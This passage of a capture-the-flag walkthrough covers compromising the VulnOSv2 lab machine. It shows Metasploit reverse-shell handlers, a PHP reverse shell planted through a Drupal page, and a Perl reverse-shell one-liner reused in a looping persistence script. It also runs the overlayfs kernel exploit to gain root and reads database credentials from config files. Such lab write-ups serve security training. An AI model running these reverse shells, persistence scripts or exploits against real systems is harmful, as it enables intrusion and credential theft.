    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
    <div>LPORT =&gt; 5432</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 0.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
    <div>msf5 exploit(multi/handler) &gt; </div>
    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
    <div>LPORT =&gt; 5433</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 1.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5433 </div>
</div>
<div><br /></div>
<div>Now, let's go create our Drupal page with our PHP reverse shell code.</div>
<div><br /></div>
<ul>
    <li>
        <div>Click Content in the top admin menu overlay</div>
    </li>
    <li>
        <div>Click Add Content</div>
    </li>
    <li>
        <div>Choose Basic page</div>
    </li>
    <li>
        <div>Give the page a Title (I'm using 'PHP Reverse Shell')</div>
    </li>
    <li>
        <div>Just below the Body, change the Text format to 'PHP code'</div>
    </li>
    <li>
        <div>Copy and paste the PHP reverse shell code created by msfvenom into the Body</div>
    </li>
    <li>
        <div>Click Save</div>
    </li>
</ul>
<div><br /></div>
<div>As soon as you click Save, your PHP code should execute and your session should be created in Metasploit.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.181:57254) at 2019-04-22 11:05:55 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
    <div>[*] Starting interaction with 1...</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwd</div>
    <div>/var/www/html/jabc</div>
    <div>id</div>
    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
    <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.181:41013) at 2019-04-22 11:06:47 -0400</div>
    <div>background</div>
    <div>
        <div><br /></div>
    </div>
    <div>Background session 1? [y/N]Â Â y</div>
    <div>msf5 exploit(multi/handler) &gt; sessions 2</div>
    <div>[*] Starting interaction with 2...</div>
    <div>
        <div><br /></div>
    </div>
    <div>www-data@VulnOSv2:/var/www/html/jabc$</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Maintaining Access</h2>
</div>
<div><br /></div>
<div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabc$ grep `whoami` /etc/passwd</div>
    <div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div>
</div>
<div><br /></div>
<div>The home directory exists and is writable.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabc$ ls -l /var</div>
    <div>[...]</div>
    <div>drwxrwxrwxÂ Â 4 root rootÂ Â Â 4096 Apr 20Â Â 2016 www</div>
</div>
<div><br /></div>
<div>However, the default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.</div>
<div><br /></div>
<div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# cat thumbs </div>
    <div>#!/bin/sh</div>
    <div>while true; do</div>
    <div>Â Â Â Â perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
    <div>Â Â Â Â # sleep for 300 seconds (5 mins)</div>
    <div>Â Â Â Â sleep 300</div>
    <div>done</div>
</div>
<div><br /></div>
<div>I uploaded the script to the victim's /var/www/html/jabc/themes/stark directory (using netcat) and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
<div><br /></div>
<div>On victim...</div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabc/themes/stark$ nc -l -p 4321 &gt; thumbs</div>
</div>
<div><br /></div>
<div>On attacker...</div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# nc -w 3 10.183.0.181 4321 &lt; thumbs</div>
</div>
<div><br /></div>
<div>Back on victim (after file transfer)...</div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabc/themes/stark$ chmod +x thumbs</div>
    <div>www-data@VulnOSv2:/var/www/html/jabc/themes/stark$ ./thumbs &amp;</div>
    <div>[1] 7592</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Privilege Escalation</h2>
</div>
<div><br /></div>
<div>We start by checking what operating system we are running using the 'uname' command.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabc$ uname -a</div>
    <div>Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux</div>
</div>
<div><br /></div>
<div>We also check 'os-release' and 'issue.net' in the /etc directory and get the following.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/etc$ cat os-release</div>
    <div>NAME="Ubuntu"</div>
    <div>VERSION="14.04.4 LTS, Trusty Tahr"</div>
    <div>ID=ubuntu</div>
    <div>ID_LIKE=debian</div>
    <div>PRETTY_NAME="Ubuntu 14.04.4 LTS"</div>
    <div>VERSION_ID="14.04"</div>
    <div>HOME_URL="http://www.ubuntu.com/"</div>
    <div>SUPPORT_URL="http://help.ubuntu.com/"</div>
    <div>BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"</div>
    <div><br /></div>
    <div>www-data@VulnOSv2:/etc$ cat issue.net</div>
    <div>Ubuntu 14.04.4 LTS</div>
</div>
<div><br /></div>
<div>Checking the exploit database, we have a few contenders.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege EscalationÂ Â Â Â Â Â Â Â Â | exploits/linux/local/37292.c</div>
    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access | exploits/linux/local/37293.txt</div>
    <div>Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege EscalationÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/local/41762.txt</div>
</div>
<div><br /></div>
<div>Let's start with the 37292.c exploit. I've gotten this one to work before.</div>
<div><br /></div>
<div>I'll transfer the C file to the victim using python's SimpleHTTPServer module.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/vulnosv2# cp /usr/share/exploitdb/exploits/linux/local/37292.c .</div>
    <div>root@kali:~/Walkthroughs/vulnosv2# python -m SimpleHTTPServer 4321</div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
</div>
<div><br /></div>
<div>Then, on the victim...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/tmp$ cd /tmp</div>
    <div>www-data@VulnOSv2:/tmp$ wget -O 37292.c 10.183.0.222:4321/37292.c</div>
    <div>--2019-04-22 17:54:42--Â Â http://10.183.0.222:4321/37292.c</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 5119 (5.0K) [text/plain]</div>
    <div>Saving to: '37292.c'</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â 0K ....Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 100%Â Â 417M=0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-04-22 17:54:42 (417 MB/s) - '37292.c' saved [5119/5119]</div>
    <div>www-data@VulnOSv2:/tmp$ gcc -o pwn 37292.c</div>
    <div>www-data@VulnOSv2:/tmp$ ./pwn</div>
    <div>spawning threads</div>
    <div>mount #1</div>
    <div>mount #2</div>
    <div>child threads done</div>
    <div>/etc/ld.so.preload created</div>
    <div>creating shared library</div>
    <div>sh: 0: can't access tty; job control turned off</div>
    <div># id</div>
    <div>uid=0(root) gid=0(root) groups=0(root),33(www-data)</div>
    <div>#</div>
</div>
<div><br /></div>
<div>Well... that was about as easy as it gets. ðŸ˜„</div>
<div><br /></div>
<div>Let's get that flag.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div># cd /root</div>
    <div># cat flag.txt</div>
    <div>Hello and welcome.</div>
    <div>You successfully compromised the company "JABC" and the server completely !!</div>
    <div>Congratulations !!!</div>
    <div>Hope you enjoyed it.</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>What do you think of A.I.?</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Pivoting</h2>
</div>
<div>N/A</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Clean Up</h2>
</div>
<div><br /></div>
<div>*** STOPÂ /var/www/html/jabc/themes/stark/thumbs ***</div>
<div>*** REMOVEÂ /var/www/html/jabc/themes/stark/thumbs ***</div>
<div>*** REMOVEÂ 37292.c and pwn from /tmp ***</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Additional Info</h2>
</div>
<div><br /></div>
<div><span style="font-weight: bold;">OpenDocMan</span></div>
<div><br /></div>
<div>We confirmed the privilege escalation vulnerability in theÂ OpenDocMan web interface. We were able to login as guest, then escalate to admin using the information from the exploit database.</div>
<div><br /></div>
<div><br /></div>
<div><span style="font-weight: bold;">jabc dbconfig.php</span></div>
<div><br /></div>
<div>I was able to pull database credentials from the dbconfig.php file underÂ /var/www/html/jabc/sites/default.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabc/sites/default$ cat dbconfig.php</div>
    <div>&lt;?php</div>
    <div>#</div>
    <div># database access settings in php format</div>
    <div># automatically generated from /etc/dbconfig-common/drupal7.conf</div>
    <div># by /usr/sbin/dbconfig-generate-include</div>
    <div>#</div>
    <div># by default this file is managed via ucf, so you shouldn't have to</div>
    <div># worry about manual changes being silently discarded.Â Â *however*,</div>
    <div># you'll probably also want to edit the configuration file mentioned</div>
    <div># above too.</div>
    <div>
        <div><br /></div>
    </div>
    <div>$databases['default']['default'] = array(</div>
    <div>Â Â Â Â Â Â Â Â 'driver' =&gt; 'mysql',</div>
    <div>Â Â Â Â Â Â Â Â 'database' =&gt; 'drupal7',</div>
    <div>Â Â Â Â Â Â Â Â 'username' =&gt; 'drupal7',</div>
    <div>Â Â Â Â Â Â Â Â 'password' =&gt; 'toor',</div>
    <div>Â Â Â Â Â Â Â Â 'host' =&gt; 'localhost',</div>
    <div>Â Â Â Â Â Â Â Â 'port' =&gt; '',</div>
    <div>Â Â Â Â Â Â Â Â 'prefix' =&gt; ''</div>
    <div>);</div>
    <div>
        <div><br /></div>
    </div>
    <div>?&gt;</div>
</div>
<div><br /></div>
<div><br /></div>
<div><span style="font-weight: bold;">jabcd0cs config.php</span></div>
<div><br /></div>
<div>I was able to pull database credentials from theÂ config.php file underÂ /var/www/html/jabcd0cs.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@VulnOSv2:/var/www/html/jabcd0cs$ cat config.php</div>
    <div>&lt;?php</div>
    <div><span style="font-size: 12px; font-family: Monaco;"><br /></span></div>
    <div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div>
    <div><br /></div>
    <div>// Eliminate multiple inclusion of config.php</div>
    <div>if( !defined('config') )</div>
    <div>{</div>
    <div>Â Â Â Â define('config', 'true', false);</div>
    <div>
        <div><br /></div>
    </div>
    <div>// config.php - useful variables/functions</div>
    <div>
        <div><br /></div>
    </div>
    <div>// ** MySQL settings - You can get this info from your web host ** //</div>
    <div>/** The name of the database for [OpenDocMan */</div>
    <div>define('DB_NAME', 'jabcd0cs');</div>
    <div>
        <div><br /></div>
    </div>
    <div>/** MySQL database username */</div>
    <div>define('DB_USER', 'root');</div>
    <div>
        <div><br /></div>
    </div>
    <div>/** MySQL database password */</div>
    <div>define('DB_PASS', 'toor');</div>
    <div>
        <div>
            <div><br /></div>
        </div>
        <div>/** MySQL hostname */</div>
        <div>/* The MySQL server. It can also include a port number. e.g. "hostname:port" or a path to a</div>
        <div> * local socket e.g. ":/path/to/socket" for the localhost.Â Â */</div>
        <div>define('DB_HOST', 'localhost');</div>
        <div>
            <div><br /></div>
            <div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div>
        </div>
    </div>
</div>
<div><br /></div>
<div><br /></div>